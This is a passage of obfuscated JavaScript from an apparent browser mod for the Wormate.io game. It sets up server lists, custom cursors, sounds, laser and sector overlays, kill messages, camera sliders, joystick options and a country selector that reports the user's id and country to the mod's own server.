            $(".servers-de, .servers-uae, .servers-us, .servers-ca, .servers-br, .servers-fr, .servers-sg, .servers-jp, .servers-gb, .servers-au").hide();
            $("." + _0xcffaff[_0x4fbf17]).fadeIn(300);
            let _0x251be4 = $(this).attr("value");
            if (typeof window.theoKzObjects !== "undefined") {
              window.theoKzObjects.flag = _0x251be4;
            }
          });
        });
      }
      function _0xef1d9d() {
        $("body").append("<div id=\"custom-tooltip\" style=\"display: none; position: absolute; z-index: 9999; background: rgba(0,0,0,0.9); padding: 5px 10px; border-radius: 4px; font-size: 10px; pointer-events: none; text-align: center;\"><div style=\"display: flex; justify-content: space-between; align-items: center;\"><span style=\"color: #ffd700; text-align: right;\">TimMap Servers </span><span style=\"color: white; margin: 0 5px;\">⟷ </span><span style=\"color: #ffd700; text-align: left;\">WormWorld Servers</span></div></div>");
        $("#sort-toggle").off("click mouseenter mouseleave");
        $("#sort-toggle").on({
          mouseenter: function (_0x6aa94f) {
            var _0x1a1450 = $("#custom-tooltip");
            var _0x1e2581 = $(this).offset();
            var _0x4dbf83 = $(this).outerWidth();
            var _0x3d2d03 = _0x1a1450.outerWidth();
            _0x1a1450.css({
              left: _0x1e2581.left + _0x4dbf83 / 2 - _0x3d2d03 / 2,
              top: _0x1e2581.top + 30
            }).fadeIn(200);
          },
          mouseleave: function () {
            $("#custom-tooltip").fadeOut(200);
          }
        });
        $("#sort-toggle").click(function () {
          if (window.currentDisplayMode === "timmap") {
            window.currentDisplayMode = "wormworld";
            $(this).addClass("wormworld").text("WormWorld Servers");
          } else {
            window.currentDisplayMode = "timmap";
            $(this).removeClass("wormworld").text("Timmap Servers");
          }
          _0x1939a0();
        });
      }
      async function _0x1f8cc5() {
        $(".description-text").html(_0x1fb425());
        const _0x49c77b = _0x117e5b();
        if (_0x49c77b) {
          _0x1939a0();
          _0x5b8854();
          _0xef1d9d();
        }
        const _0x2243df = await _0xa255e5();
        if (_0x2243df && !_0x49c77b) {
          _0x1939a0();
          _0x5b8854();
          _0xef1d9d();
        } else if (_0x2243df && _0x49c77b) {
          _0x1939a0();
        }
        if (!_0x49c77b && !_0x2243df) {
          $(".description-text").html("🎮 Failed to load servers. Please try again later.");
        }
        setInterval(() => {
          _0xa255e5().then(_0x18b25e => {
            if (_0x18b25e) {
              _0x1939a0();
            }
          });
        }, 300000);
      }
      _0x1f8cc5();
    }
    $(document).ready(function () {
      $(document).on("mouseenter", ".server-score", function (_0x45c5d6) {
        $(".player-tooltip").remove();
        const _0x17c3c6 = $(this).closest(".selectSala");
        const _0x2815d3 = _0x17c3c6.data("players");
        if (!_0x2815d3) {
          return;
        }
        let _0x10696a = [];
        try {
          _0x10696a = typeof _0x2815d3 === "string" ? JSON.parse(_0x2815d3) : _0x2815d3;
        } catch (_0x6ae08d) {
          return;
        }
        if (!_0x10696a || !_0x10696a.length) {
          return;
        }
        let _0x1dae2c = "<table>";
        const _0x5e64fc = Math.min(_0x10696a.length, 10);
        for (let _0x2307de = 0; _0x2307de < _0x5e64fc; _0x2307de++) {
          const _0xc4a45c = _0x10696a[_0x2307de];
          _0x1dae2c += "<tr>\n                    <td class=\"rank\">" + (_0x2307de + 1) + "-</td>\n                    <td class=\"name\">" + (_0xc4a45c.name || "Player_" + _0xc4a45c.id) + "</td>\n                    <td class=\"score\">" + _0x35a6e6(_0xc4a45c.score) + "</td>\n                </tr>";
        }
        _0x1dae2c += "</table>";
        const _0x1c5610 = $("<div class=\"player-tooltip\"></div>").html(_0x1dae2c).css({
          top: _0x45c5d6.pageY + 10,
          left: _0x45c5d6.pageX + 10
        });
        $("body").append(_0x1c5610);
        $(this).data("tooltip", _0x1c5610);
      });
      $(document).on("mouseleave", ".server-score", function () {
        const _0x2a4dc3 = $(this).data("tooltip");
        if (_0x2a4dc3) {
          setTimeout(function () {
            _0x2a4dc3.remove();
          }, 100);
        }
      });
      $(document).on("mousemove", ".server-score", function (_0x1877df) {
        const _0x2932ed = $(this).data("tooltip");
        if (_0x2932ed) {
          _0x2932ed.css({
            top: _0x1877df.pageY + 10,
            left: _0x1877df.pageX + 10
          });
        }
      });
    });
    function _0x35a6e6(_0x54978c) {
      if (_0x54978c >= 1000000) {
        return (_0x54978c / 1000000).toFixed(2) + "M";
      } else if (_0x54978c >= 1000) {
        return (_0x54978c / 1000).toFixed(1) + "K";
      } else {
        return _0x54978c.toFixed(0);
      }
    }
    function _0x1b58af() {
      function _0x569e78(_0x5e599d) {
        document.querySelectorAll(".sidebar-item").forEach(function (_0x3586c8) {
          _0x3586c8.classList.remove("active");
        });
        document.querySelectorAll(".tab-content").forEach(function (_0xaff3f) {
          _0xaff3f.style.display = "none";
        });
        var _0xdce097 = document.querySelector(".sidebar-item[data-tab=\"" + _0x5e599d + "\"]");
        var _0x2785e6 = document.getElementById(_0x5e599d + "-tab");
        if (_0xdce097) {
          _0xdce097.classList.add("active");
        }
        if (_0x2785e6) {
          _0x2785e6.style.display = "block";
        }
      }
      document.querySelectorAll(".sidebar-item").forEach(function (_0x84c2d1) {
        _0x84c2d1.addEventListener("click", function () {
          var _0x49daad = this.getAttribute("data-tab");
          if (_0x49daad) {
            _0x569e78(_0x49daad);
          }
        });
      });
      _0x569e78("game-settings");
    }
    function _0x2370bc(_0x10af22, _0x51c081) {
      var _0x59106f = document.getElementById("btn_copy");
      if (_0x59106f) {
        _0x59106f.onclick = function () {
          var _0x512446 = document.getElementById("id_customer");
          if (_0x512446) {
            _0x512446.select();
            _0x512446.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(_0x512446.value);
            var _0x4f5edd = document.getElementById("myTooltip");
            if (_0x4f5edd) {
              _0x4f5edd.innerHTML = _0x10af22.ccg[14] + "!";
              _0x4f5edd.style.visibility = "visible";
              _0x4f5edd.style.opacity = "1";
              setTimeout(function () {
                _0x4f5edd.style.visibility = "hidden";
                _0x4f5edd.style.opacity = "0";
              }, 1500);
            } else {
              alert("ID " + _0x512446.value + " copied!");
            }
          }
        };
        $(_0x59106f).hover(function () {
          $("#myTooltip").css("visibility", "visible");
          $("#myTooltip").css("opacity", "1");
        }, function () {
          if ($("#myTooltip").text() !== _0x10af22.ccg[14] + "!") {
            $("#myTooltip").css("visibility", "hidden");
            $("#myTooltip").css("opacity", "0");
          }
        });
      }
      var _0x1c8142 = document.getElementById("modal_wup");
      var _0x1cc7a9 = document.getElementById("op_wup");
      var _0x5b100b = document.getElementsByClassName("close")[0];
      if (_0x1cc7a9 && _0x1c8142) {
        _0x1cc7a9.onclick = function (_0xbbc4d3) {
          _0xbbc4d3.preventDefault();
          _0xbbc4d3.stopPropagation();
          _0x1c8142.style.display = "block";
          setTimeout(function () {
            if (typeof _0x1b58af === "function") {
              _0x1b58af();
            }
          }, 50);
          return false;
        };
      }
      function _0x2dd633() {
        _0x1c8142.style.display = "none";
      }
      if (_0x5b100b && _0x1c8142) {
        _0x5b100b.onclick = function (_0x1784ac) {
          _0x1784ac.preventDefault();
          _0x1784ac.stopPropagation();
          _0x2dd633();
          return false;
        };
      }
      document.addEventListener("click", function (_0x51779c) {
        if (_0x1c8142.style.display === "block" && !_0x1c8142.contains(_0x51779c.target) && _0x51779c.target !== _0x1cc7a9) {
          _0x2dd633();
        }
      });
      _0x1c8142.onclick = function (_0x38cb82) {
        _0x38cb82.stopPropagation();
      };
      _0xa69fb6();
      _0x4129df();
      setupLaserSystem();
      _0x294cd6();
      _0x3b3e94();
      _0x5ddf94();
      _0x33c3ea();
      _0x37fe9b();
    }
    function _0xa69fb6() {
      const _0x401b28 = [{
        name: "Turquoise Mouse Pointer",
        url: atob(_0x56e2a2[40])
      }, {
        name: "White Mouse Pointer",
        url: atob(_0x56e2a2[41])
      }, {
        name: "Pink Octopus Cursor",
        url: atob(_0x56e2a2[42])
      }, {
        name: "Beetle Cursor",
        url: atob(_0x56e2a2[43])
      }, {
        name: "TikTok Cursor",
        url: atob(_0x56e2a2[44])
      }, {
        name: "Watermelon Cursor",
        url: atob(_0x56e2a2[45])
      }, {
        name: "Red Lipstick Cursor",
        url: atob(_0x56e2a2[46])
      }, {
        name: "Flame Cursor",
        url: atob(_0x56e2a2[47])
      }, {
        name: "Cherries Cursor",
        url: atob(_0x56e2a2[48])
      }, {
        name: "Pink Hearts Cursor",
        url: atob(_0x56e2a2[49])
      }, {
        name: "Spray Can Cursor",
        url: atob(_0x56e2a2[50])
      }, {
        name: "Beach Umbrella Cursor",
        url: atob(_0x56e2a2[51])
      }, {
        name: "Three-colored Glove Cursor",
        url: atob(_0x56e2a2[52])
      }, {
        name: "Pink Dolphin Cursor",
        url: atob(_0x56e2a2[53])
      }, {
        name: "Mushroom Cursor",
        url: atob(_0x56e2a2[54])
      }, {
        name: "Octopus Glove Cursor",
        url: atob(_0x56e2a2[55])
      }, {
        name: "Yellow Cheese Cursor",
        url: atob(_0x56e2a2[56])
      }, {
        name: "Roasting Marshmallow Cursor",
        url: atob(_0x56e2a2[57])
      }, {
        name: "White Glove Cursor",
        url: atob(_0x56e2a2[58])
      }, {
        name: "Red Pepper Cursor",
        url: atob(_0x56e2a2[59])
      }, {
        name: "Magic Wand with Golden Star Cursor",
        url: atob(_0x56e2a2[60])
      }, {
        name: "Strawberry and Chocolate Ice Cream Cursor",
        url: atob(_0x56e2a2[61])
      }, {
        name: "Dagger Cursor",
        url: atob(_0x56e2a2[62])
      }, {
        name: "Pizza Slice Cursor",
        url: atob(_0x56e2a2[63])
      }, {
        name: "Strawberry Candy Cursor",
        url: atob(_0x56e2a2[64])
      }, {
        name: "Rose Branch Cursor",
        url: atob(_0x56e2a2[65])
      }, {
        name: "Electrical Plug Cursor",
        url: atob(_0x56e2a2[66])
      }, {
        name: "Heart on Stick Cursor",
        url: atob(_0x56e2a2[67])
      }];
      window.wormupCursors = _0x401b28;
      const _0x4b4fa7 = localStorage.getItem("selectedCursor");
      if (_0x4b4fa7) {
        $("#game-cont, #game-canvas, body").css({
          cursor: "url(" + _0x4b4fa7 + "), default"
        });
        const _0x20252a = _0x401b28.find(_0x596919 => _0x596919.url === _0x4b4fa7);
        if (_0x20252a) {
          $("#current-cursor-name").text("Current: " + _0x20252a.name);
        }
      }
      const _0x58f8fa = $(".cursor-container");
      if (_0x58f8fa.length > 0) {
        _0x58f8fa.empty();
        _0x401b28.forEach(function (_0x7398dc) {
          const _0xac52 = _0x4b4fa7 === _0x7398dc.url;
          const _0xb67cd2 = $("\n            <div class=\"cursor-item " + (_0xac52 ? "active" : "") + "\" data-cursor=\"" + _0x7398dc.url + "\" title=\"" + _0x7398dc.name + "\" style=\"width: 60px; height: 60px; display: inline-block; margin: 5px; cursor: pointer; border: 2px solid " + (_0xac52 ? "#ffcc00" : "#333333") + "; border-radius: 8px; overflow: hidden; text-align: center; background-color: #232339;\">\n              <img src=\"" + _0x7398dc.url + "\" alt=\"" + _0x7398dc.name + "\" style=\"width: 32px; height: 32px; margin-top: 14px;\">\n            </div>\n          ");
          _0xb67cd2.click(function () {
            $(".cursor-item").removeClass("active").css("border-color", "#333333");
            $(this).addClass("active").css("border-color", "#ffcc00");
            const _0x25e555 = $(this).data("cursor");
            localStorage.setItem("selectedCursor", _0x25e555);
            $("#game-cont, #game-canvas, body").css({
              cursor: "url(" + _0x25e555 + "), default"
            });
            $("#current-cursor-name").text("Current: " + _0x7398dc.name);
          });
          _0x58f8fa.append(_0xb67cd2);
        });
      }
      $("#default-cursor-btn").click(function () {
        localStorage.removeItem("selectedCursor");
        $("#game-cont, #game-canvas, body").css("cursor", "default");
        $("#current-cursor-name").text("Current: Default");
        $(".cursor-item").removeClass("active").css("border-color", "#333333");
      });
    }
    function _0x4129df() {
      $("#wupsound").prop("checked", _0x207b06.vh || false);
      $("#sound_effect_selector").val(_0x207b06.soundEffect || "https://wormateup.live/images/store/hs_2.mp3");
      $("#volume_slider").val(_0x207b06.soundVolume || 50);
      $("#volume_value").text(_0x207b06.soundVolume || 50);
      let _0x28eda6 = null;
      function _0xd8147d(_0x182792, _0x6b5bff) {
        if (_0x28eda6) {
          _0x28eda6.pause();
          _0x28eda6.currentTime = 0;
        }
        _0x182792.volume = _0x6b5bff / 100;
        _0x182792.currentTime = 0;
        _0x182792.play();
        _0x28eda6 = _0x182792;
      }
      $("#wupsound").change(function () {
        _0x207b06.vh = $(this).prop("checked");
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        if (_0x207b06.vh) {
          const _0x17ecc4 = document.getElementById("s_h");
          if (_0x17ecc4) {
            _0xd8147d(_0x17ecc4, _0x207b06.soundVolume || 50);
          }
        }
      });
      $("#sound_effect_selector").change(function () {
        _0x207b06.soundEffect = $(this).val();
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        const _0x193378 = document.getElementById("s_h");
        if (_0x193378) {
          const _0x3febc0 = _0x193378.querySelector("source");
          if (_0x3febc0) {
            _0x3febc0.src = _0x207b06.soundEffect;
            _0x193378.load();
            if (_0x207b06.vh) {
              setTimeout(() => {
                _0xd8147d(_0x193378, _0x207b06.soundVolume || 50);
              }, 100);
            }
          }
        }
      });
      $("#volume_slider").on("input", function () {
        _0x207b06.soundVolume = parseInt($(this).val());
        $("#volume_value").text(_0x207b06.soundVolume);
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        if (_0x207b06.vh) {
          const _0x21b24e = document.getElementById("s_h");
          if (_0x21b24e) {
            _0xd8147d(_0x21b24e, _0x207b06.soundVolume);
          }
        }
      });
      $("#monster_kill_selector").change(function () {
        const _0x4feb71 = $(this).val();
        _0x207b06.monsterKillSound = _0x4feb71;
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        const _0x3ec9cb = document.getElementById("monster_kill_sound");
        if (_0x3ec9cb) {
          const _0x415037 = _0x3ec9cb.querySelector("source");
          if (_0x415037) {
            _0x415037.src = _0x4feb71;
            _0x3ec9cb.load();
            if (_0x207b06.vh) {
              setTimeout(() => {
                _0xd8147d(_0x3ec9cb, _0x207b06.soundVolume || 50);
              }, 100);
            }
          }
        }
      });
      if (_0x207b06.monsterKillSound) {
        $("#monster_kill_selector").val(_0x207b06.monsterKillSound);
        const _0x4d9461 = document.getElementById("monster_kill_sound");
        if (_0x4d9461) {
          const _0x3b12e8 = _0x4d9461.querySelector("source");
          if (_0x3b12e8) {
            _0x3b12e8.src = _0x207b06.monsterKillSound;
          }
        }
      }
      window.wormupAudio = {
        playSound: _0xd8147d,
        updateSoundEffect: function (_0x48e7c8) {
          _0x207b06.soundEffect = _0x48e7c8;
          $("#sound_effect_selector").val(_0x48e7c8);
          const _0x54ca73 = document.getElementById("s_h");
          if (_0x54ca73) {
            const _0x41c225 = _0x54ca73.querySelector("source");
            if (_0x41c225) {
              _0x41c225.src = _0x48e7c8;
              _0x54ca73.load();
            }
          }
        },
        updateMonsterKillSound: function (_0x5efa08) {
          _0x207b06.monsterKillSound = _0x5efa08;
          $("#monster_kill_selector").val(_0x5efa08);
          const _0x32d074 = document.getElementById("monster_kill_sound");
          if (_0x32d074) {
            const _0x321816 = _0x32d074.querySelector("source");
            if (_0x321816) {
              _0x321816.src = _0x5efa08;
              _0x32d074.load();
            }
          }
        },
        updateVolume: function (_0x458524) {
          _0x207b06.soundVolume = _0x458524;
          $("#volume_slider").val(_0x458524);
          $("#volume_value").text(_0x458524);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        },
        toggleSound: function (_0x1a5d83) {
          _0x207b06.vh = _0x1a5d83;
          $("#wupsound").prop("checked", _0x1a5d83);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        },
        testCurrentSound: function () {
          if (_0x207b06.vh) {
            const _0x21f0a5 = document.getElementById("s_h");
            if (_0x21f0a5) {
              _0xd8147d(_0x21f0a5, _0x207b06.soundVolume || 50);
            }
          }
        },
        testMonsterKillSound: function () {
          if (_0x207b06.vh) {
            const _0x1e2397 = document.getElementById("monster_kill_sound");
            if (_0x1e2397) {
              _0xd8147d(_0x1e2397, _0x207b06.soundVolume || 50);
            }
          }
        }
      };
    }
    function _0x18cae8() {
      $("#Laserup").prop("checked", window.laserOptions.enabled);
      const _0x5b2ced = "#" + window.laserOptions.color.toString(16).padStart(6, "0");
      $("#laser_color_picker").val(_0x5b2ced);
      $("#laser_opacity_slider").val(window.laserOptions.opacity * 100);
      $("#laser_opacity_value").text(Math.round(window.laserOptions.opacity * 100));
      $("#Laserup").off("change.laser");
      $("#laser_color_picker").off("change.laser");
      $("#laser_opacity_slider").off("input.laser");
      $(document).off("keydown.laser");
      $("#Laserup").on("change.laser", function () {
        window.laserOptions.enabled = $(this).prop("checked");
        _0x207b06.ls = $(this).prop("checked");
        localStorage.setItem("laserOptions", JSON.stringify(window.laserOptions));
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      });
      $("#laser_color_picker").on("change.laser", function () {
        const _0x4309c5 = $(this).val();
        window.laserOptions.color = parseInt(_0x4309c5.replace("#", "0x"));
        localStorage.setItem("laserOptions", JSON.stringify(window.laserOptions));
      });
      $("#laser_opacity_slider").on("input.laser", function () {
        const _0xa6cfdc = parseInt($(this).val());
        window.laserOptions.opacity = _0xa6cfdc / 100;
        $("#laser_opacity_value").text(_0xa6cfdc);
        localStorage.setItem("laserOptions", JSON.stringify(window.laserOptions));
      });
      $(document).off("keydown.laser").on("keydown.laser", function (_0x4458a8) {
        if ($(_0x4458a8.target).is("input, textarea, select") || $(_0x4458a8.target).closest(".modal").length > 0) {
          return;
        }
        if (_0x4458a8.which === 76) {
          _0x4458a8.preventDefault();
          const _0x14f977 = $("#Laserup");
          const _0x37ce93 = !_0x14f977.prop("checked");
          _0x14f977.prop("checked", _0x37ce93).trigger("change.laser");
        }
        if (_0x4458a8.which === 79) {
          _0x4458a8.preventDefault();
          let _0x44ab99 = parseInt($("#laser_opacity_slider").val());
          if (_0x44ab99 < 100) {
            $("#laser_opacity_slider").val(_0x44ab99 + 10).trigger("input.laser");
          }
        }
        if (_0x4458a8.which === 80) {
          _0x4458a8.preventDefault();
          let _0x24b90d = parseInt($("#laser_opacity_slider").val());
          if (_0x24b90d > 10) {
            $("#laser_opacity_slider").val(_0x24b90d - 10).trigger("input.laser");
          }
        }
      });
    }
    _0x18cae8();
    window.wormupLaser = window.laserOptions;
    window.bindLaserEvents = _0x18cae8;
    function _0x294cd6() {
      setTimeout(() => {
        if (window.sectorSystem && typeof window.sectorSystem.init === "function") {
          window.sectorSystem.init();
        }
        $(".sidebar-item[data-tab='backgrounds']").on("click", function () {
          if (window.sectorSystem && typeof window.sectorSystem.initUserInterface === "function") {
            setTimeout(() => window.sectorSystem.initUserInterface(), 100);
          }
        });
        $("#sector_system_toggle").change(function () {
          const _0x2768e0 = $(this).prop("checked");
          $("#sector_settings_panel").toggle(_0x2768e0);
          localStorage.setItem("sectorSystemEnabled", _0x2768e0);
        });
        $("#sector_show_lines").change(function () {
          const _0x3f1209 = $(this).prop("checked");
          $("#sector_lines_options").toggle(_0x3f1209);
        });
        $(document).off("keydown.sector").on("keydown.sector", function (_0xeca8c7) {
          if (document.activeElement.id === "mm-params-nickname") {
            return;
          }
          if (_0xeca8c7.which === 83 || _0xeca8c7.which === 187) {
            _0xeca8c7.preventDefault();
            $("#sector_system_toggle").prop("checked", !$("#sector_system_toggle").prop("checked")).trigger("change");
          }
          if (_0xeca8c7.which === 88) {
            _0xeca8c7.preventDefault();
            if ($("#sector_display_mode").val() === "sectors") {
              $("#sector_display_mode").val("quarters").trigger("change");
            } else {
              $("#sector_display_mode").val("sectors").trigger("change");
            }
          }
        });
      }, 1500);
    }
    function _0x3b3e94() {
      setTimeout(() => {
        if (_0x207b06.killMsg) {
          $("#kill_msg").val(_0x207b06.killMsg);
        }
        if (_0x207b06.headshotMsg) {
          $("#headshot_msg").val(_0x207b06.headshotMsg);
        }
        if (_0x207b06.killCustomText) {
          $("#kill_custom_text").val(_0x207b06.killCustomText);
        }
        if (_0x207b06.headshotCustomText) {
          $("#headshot_custom_text").val(_0x207b06.headshotCustomText);
        }
        $("#kill_show_name").prop("checked", _0x207b06.showKillName !== false);
        $("#headshot_show_name").prop("checked", _0x207b06.showHeadshotName !== false);
        $("#kill_name_position").val(_0x207b06.killNamePos || "after");
        $("#headshot_name_position").val(_0x207b06.headshotNamePos || "after");
        if (typeof _0x207b06.iq !== "undefined") {
          $("#wupiq").prop("checked", _0x207b06.iq);
          if (_0x207b06.iq) {
            $("#custom-messages-container").addClass("messages-disabled");
          }
        }
        $("#wupiq").off("change.msg").on("change.msg", function () {
          _0x207b06.iq = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          if ($(this).prop("checked")) {
            $("#custom-messages-container").addClass("messages-disabled");
          } else {
            $("#custom-messages-container").removeClass("messages-disabled");
          }
        });
        $("#kill_msg").off("change.msg").on("change.msg", function () {
          _0x207b06.killMsg = $(this).val();
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#headshot_msg").off("change.msg").on("change.msg", function () {
          _0x207b06.headshotMsg = $(this).val();
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#kill_show_name").off("change.msg").on("change.msg", function () {
          _0x207b06.showKillName = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#headshot_show_name").off("change.msg").on("change.msg", function () {
          _0x207b06.showHeadshotName = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#kill_name_position").off("change.msg").on("change.msg", function () {
          _0x207b06.killNamePos = $(this).val();
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#headshot_name_position").off("change.msg").on("change.msg", function () {
          _0x207b06.headshotNamePos = $(this).val();
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#kill_custom_text").off("input.msg").on("input.msg", function () {
          const _0x1cd63d = $(this).val().trim();
          if (_0x1cd63d !== "") {
            _0x207b06.killMsgType = "custom";
            _0x207b06.killCustomText = _0x1cd63d;
          } else {
            _0x207b06.killMsgType = "preset";
            delete _0x207b06.killCustomText;
          }
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#headshot_custom_text").off("input.msg").on("input.msg", function () {
          const _0xaa8d9 = $(this).val().trim();
          if (_0xaa8d9 !== "") {
            _0x207b06.headshotMsgType = "custom";
            _0x207b06.headshotCustomText = _0xaa8d9;
          } else {
            _0x207b06.headshotMsgType = "preset";
            delete _0x207b06.headshotCustomText;
          }
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
      }, 500);
    }
    function _0x5ddf94() {
      setTimeout(() => {
        $("#eating_speed_toggle").prop("checked", _0x207b06.eat_animation >= 1);
        $("#eating_speed_toggle").change(function () {
          _0x207b06.eat_animation = $(this).prop("checked") ? 1 : 0.0025;
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
      }, 800);
      setTimeout(() => {
        const _0x302baa = setInterval(() => {
          if (window.utils && window.utils.prototype) {
            clearInterval(_0x302baa);
            const _0x569ace = window.utils.prototype.Qj;
            if (_0x569ace) {
              window.utils.prototype.Qj = function (_0x3e4e1c, _0x1be909, _0x34f929) {
                this.Hj = window.decoder.ga(this.Hj, this.Fj, _0x1be909, _0x207b06.eat_animation);
                this.Ij = window.decoder.ga(this.Ij, this.Gj, _0x1be909, 0.0025);
                this.Nj.Bg(this, _0x3e4e1c, _0x1be909, _0x34f929);
              };
            }
          }
        }, 1000);
      }, 2000);
    }
    function _0x33c3ea() {
      setTimeout(() => {
        $("#spin_fast_slider").val(_0x207b06.smoothCamera || 0.5);
        $("#spin_fast_value").text(_0x207b06.smoothCamera || 0.5);
        $("#zoom_speed_slider").val(_0x207b06.zoomSpeed || 0.003);
        $("#zoom_speed_value").text(_0x207b06.zoomSpeed || 0.003);
        $("#portion_size_slider").val(_0x207b06.PortionSize || 2);
        $("#portion_size_value").text(_0x207b06.PortionSize || 2);
        $("#portion_aura_slider").val(_0x207b06.PortionAura || 1.2);
        $("#portion_aura_value").text(_0x207b06.PortionAura || 1.2);
        $("#food_size_slider").val(_0x207b06.FoodSize || 2);
        $("#food_size_value").text(_0x207b06.FoodSize || 2);
        $("#food_shadow_slider").val(_0x207b06.FoodShadow || 2);
        $("#food_shadow_value").text(_0x207b06.FoodShadow || 2);
        $("#spin_fast_slider").on("input", function () {
          const _0x3f6471 = parseFloat($(this).val());
          _0x207b06.smoothCamera = _0x3f6471;
          $("#spin_fast_value").text(_0x3f6471);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#zoom_speed_slider").on("input", function () {
          const _0x112dad = parseFloat($(this).val());
          _0x207b06.zoomSpeed = _0x112dad;
          $("#zoom_speed_value").text(_0x112dad);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#portion_size_slider").on("input", function () {
          const _0x43fbc4 = parseFloat($(this).val());
          _0x207b06.PortionSize = _0x43fbc4;
          $("#portion_size_value").text(_0x43fbc4);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#portion_aura_slider").on("input", function () {
          const _0x5d2ed0 = parseFloat($(this).val());
          _0x207b06.PortionAura = _0x5d2ed0;
          $("#portion_aura_value").text(_0x5d2ed0);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#food_size_slider").on("input", function () {
          const _0x2cf1b7 = parseFloat($(this).val());
          _0x207b06.FoodSize = _0x2cf1b7;
          $("#food_size_value").text(_0x2cf1b7);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#food_shadow_slider").on("input", function () {
          const _0x53a30a = parseFloat($(this).val());
          _0x207b06.FoodShadow = _0x53a30a;
          $("#food_shadow_value").text(_0x53a30a);
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $(".reset-btn").click(function () {
          const _0x331915 = $(this).data("reset");
          const _0x2f5af5 = parseFloat($(this).data("default"));
          switch (_0x331915) {
            case "spin_fast":
              $("#spin_fast_slider").val(_0x2f5af5).trigger("input");
              break;
            case "portion_size":
              $("#portion_size_slider").val(_0x2f5af5).trigger("input");
              break;
            case "portion_aura":
              $("#portion_aura_slider").val(_0x2f5af5).trigger("input");
              break;
            case "food_size":
              $("#food_size_slider").val(_0x2f5af5).trigger("input");
              break;
            case "food_shadow":
              $("#food_shadow_slider").val(_0x2f5af5).trigger("input");
              break;
            case "zoom_speed":
              $("#zoom_speed_slider").val(_0x2f5af5).trigger("input");
              break;
          }
        });
      }, 1000);
    }
    function _0x37fe9b() {
      setTimeout(() => {
        if (!_0x207b06.mobile) {
          $("#mobile-tab-item").hide();
        } else {
          $("#mobile-tab-item").show();
          $("#config_mobile").html(_0xa2a78e.mb || "");
          $("#joystick_size").on("input", function () {
            var _0x31d21c = $(this).val();
            $("#joystick_size_value").text(_0x31d21c);
            if (!_0x207b06.joystick) {
              _0x207b06.joystick = {};
            }
            _0x207b06.joystick.size = parseInt(_0x31d21c);
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          });
          $("#joystick_pxy").on("input", function () {
            var _0x283c25 = $(this).val();
            $("#joystick_pxy_value").text(_0x283c25);
            if (!_0x207b06.joystick) {
              _0x207b06.joystick = {};
            }
            _0x207b06.joystick.pxy = parseInt(_0x283c25);
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          });
          if (_0x207b06.joystick) {
            $("#joystick_checked").val(_0x207b06.joystick.checked || true);
            $("#joystick_color").val(_0x207b06.joystick.color || "red");
            $("#joystick_mode").val(_0x207b06.joystick.mode || "dynamic");
            $("#joystick_position").val(_0x207b06.joystick.positionMode || "L");
            $("#joystick_size").val(_0x207b06.joystick.size || 100);
            $("#joystick_pxy").val(_0x207b06.joystick.pxy || 100);
            $("#joystick_size_value").text(_0x207b06.joystick.size || 100);
            $("#joystick_pxy_value").text(_0x207b06.joystick.pxy || 100);
          }
        }
      }, 500);
    }
    function _0x1c6c90(_0x5962c7, _0x52e2aa) {
      var _0x1b891c = [{
        name: "Vietnam",
        val: "vn"
      }, {
        name: "Thailand",
        val: "th"
      }, {
        name: "Cambodia",
        val: "kh"
      }, {
        name: "Indonesia",
        val: "id"
      }, {
        name: "Singapore",
        val: "sg"
      }, {
        name: "Japan",
        val: "jp"
      }, {
        name: "Mexico",
        val: "mx"
      }, {
        name: "Brazil",
        val: "br"
      }, {
        name: "Canada",
        val: "ca"
      }, {
        name: "Germany",
        val: "de"
      }, {
        name: "France",
        val: "fr"
      }, {
        name: "England",
        val: "gb"
      }, {
        name: "Australia",
        val: "au"
      }, {
        name: "USA",
        val: "us"
      }, {
        name: "Portugal",
        val: "pt"
      }, {
        name: "Turkey",
        val: "tr"
      }, {
        name: _0x5962c7.ccg[36] || "Iraq",
        val: "iq"
      }];
      let _0x1fa024 = document.getElementById("sel_country");
      if (_0x1fa024) {
        _0x1fa024.innerHTML = "";
        for (let _0x3ab046 = 0; _0x3ab046 < _0x1b891c.length; _0x3ab046++) {
          let _0x537201 = document.createElement("option");
          _0x537201.value = _0x1b891c[_0x3ab046].val;
          _0x537201.innerHTML = _0x1b891c[_0x3ab046].name;
          _0x1fa024.appendChild(_0x537201);
        }
        if (window.savedOco) {
          _0x1fa024.value = window.savedOco;
        }
        _0x1fa024.onchange = function () {
          let _0x375a6a = _0x1fa024.value;
          window.savedOco = _0x375a6a;
          localStorage.setItem("oco", _0x375a6a);
          var _0x468ac7 = {
            id_wormate: _0x52e2aa.userId,
            country: _0x375a6a
          };
          fetch(_0x207b06.s_l + "/check", {
            headers: {
              "Content-Type": "application/json"
            },
            method: "POST",
            body: JSON.stringify(_0x468ac7)
          });
          localStorage.removeItem("wupsw");
